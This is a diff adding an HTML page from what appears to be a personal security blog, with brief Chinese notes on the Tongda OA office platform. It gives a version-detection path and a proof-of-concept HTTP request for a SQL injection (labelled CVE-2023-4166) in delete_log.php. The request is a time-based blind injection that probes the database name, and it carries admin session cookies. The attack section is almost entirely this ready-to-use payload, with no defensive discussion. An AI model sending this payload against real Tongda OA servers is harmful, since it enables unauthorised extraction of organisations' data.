@@ -1,0 +1,152 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  
+  
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    
+    
+    
+    <link rel="shortcut icon" href="../../../../../img/favicon.ico">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" />
+    <title>通达 - ConsT27's Blog</title>
+    <link href="../../../../../css/bootstrap-3.3.7.min.css" rel="stylesheet">
+    <link href="../../../../../css/font-awesome-4.7.0.css" rel="stylesheet">
+    <link href="../../../../../css/base.css" rel="stylesheet">
+    <link rel="stylesheet" href="../../../../../css/highlight.css">
+    <!-- HTML5 shim and Respond.js IE8 support of HTML5 elements and media queries -->
+    <!--[if lt IE 9]>
+        <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
+        <script src="https://oss.maxcdn.com/libs/respond.js/1.3.0/respond.min.js"></script>
+    <![endif]-->
+
+    <script src="../../../../../js/jquery-3.2.1.min.js"></script>
+    <script src="../../../../../js/bootstrap-3.3.7.min.js"></script>
+    <script src="../../../../../js/highlight.pack.js"></script>
+    
+    <base target="_top">
+    <script>
+      var base_url = '../../../../..';
+      var is_top_frame = false;
+        
+        var pageToc = [
+          {title: "\u901a\u8fbe", url: "#_top", children: [
+              {title: "\u76ee\u5f55", url: "#_2" },
+              {title: "\u7248\u672c\u63a2\u6d4b", url: "#_3" },
+              {title: "\u901a\u8fbeOA\uff08CVE-2023-4166\uff09", url: "#oacve-2023-4166" },
+          ]},
+        ];
+
+    </script>
+    <script src="../../../../../js/base.js"></script> 
+</head>
+
+<body>
+<script>
+if (is_top_frame) { $('body').addClass('wm-top-page'); }
+</script>
+
+
+
+<div class="container-fluid wm-page-content">
+  <a name="_top"></a>
+    
+
+    
+    
+      
+    
+
+  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
+    
+    <div class="wm-article-nav pull-right">
+      <a href="../../%E9%87%91%E5%92%8C/%E9%87%91%E5%92%8C/" class="btn btn-xs btn-default pull-right">
+        Next
+        <i class="fa fa-chevron-right" aria-hidden="true"></i>
+      </a>
+      <a href="../../%E9%87%91%E5%92%8C/%E9%87%91%E5%92%8C/" class="btn btn-xs btn-link">
+        金和
+      </a>
+    </div>
+    
+    <div class="wm-article-nav">
+      <a href="../../%E8%93%9D%E5%87%8C/%E8%93%9D%E5%87%8C/" class="btn btn-xs btn-default pull-left">
+        <i class="fa fa-chevron-left" aria-hidden="true"></i>
+        Previous</a><a href="../../%E8%93%9D%E5%87%8C/%E8%93%9D%E5%87%8C/" class="btn btn-xs btn-link">
+        蓝凌
+      </a>
+    </div>
+    
+  </div>
+
+    
+
+    <h1 id="_1">通达</h1>
+<h2 id="_2">目录</h2>
+<ul>
+<li><a href="#版本探测">版本探测</a></li>
+<li><a href="#通达OACVE-2023-4166">通达OA（CVE-2023-4166）</a></li>
+</ul>
+<h2 id="_3">版本探测</h2>
+<pre><code class="language-纯文本">/inc/expired.php
+</code></pre>
+<h2 id="oacve-2023-4166">通达OA（CVE-2023-4166）</h2>
+<p>sql注入</p>
+<p>描述-影响范围
+通达OA
+是由北京通达信科科技有限公司自主研发的协同办公自动化软件，是适合各个行业用户的综合管理办公平台
+本次范围：通达OA版本11.10之前
+POC π</p>
+<pre><code class="language-纯文本">GET /general/system/seal_manage/dianju/delete_log.php?DELETE_STR=1)%20and%20(substr(DATABASE(),1,1))=char(84)%20and%20(select%20count(*)%20from%20information_schema.columns%20A,information_schema.columns%20B)%20and(1)=(1 HTTP/1.1
+Host: 192.168.232.137:8098
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/116.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+Accept-Encoding: gzip, deflate
+Connection: close
+Cookie: PHPSESSID=1u7tsd1cpgp9qvco726smb50h5; USER_NAME_COOKIE=admin; OA_USER_ID=admin; SID_1=779f3f46
+Upgrade-Insecure-Requests: 1
+
+</code></pre>
+
+  <br>
+    
+
+    
+    
+      
+    
+
+  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
+    
+    <div class="wm-article-nav pull-right">
+      <a href="../../%E9%87%91%E5%92%8C/%E9%87%91%E5%92%8C/" class="btn btn-xs btn-default pull-right">
+        Next
+        <i class="fa fa-chevron-right" aria-hidden="true"></i>
+      </a>
+      <a href="../../%E9%87%91%E5%92%8C/%E9%87%91%E5%92%8C/" class="btn btn-xs btn-link">
+        金和
+      </a>
+    </div>
+    
+    <div class="wm-article-nav">
+      <a href="../../%E8%93%9D%E5%87%8C/%E8%93%9D%E5%87%8C/" class="btn btn-xs btn-default pull-left">
+        <i class="fa fa-chevron-left" aria-hidden="true"></i>
+        Previous</a><a href="../../%E8%93%9D%E5%87%8C/%E8%93%9D%E5%87%8C/" class="btn btn-xs btn-link">
+        蓝凌
+      </a>
+    </div>
+    
+  </div>
+
+    <br>
+</div>
+
+<footer class="container-fluid wm-page-content">
+  <p>Documentation built with <a href="https://www.mkdocs.org/">MkDocs</a> using <a href="https://github.com/gristlabs/mkdocs-windmill">Windmill</a> theme by Grist Labs.</p>
+</footer>
+
+</body>
+</html>
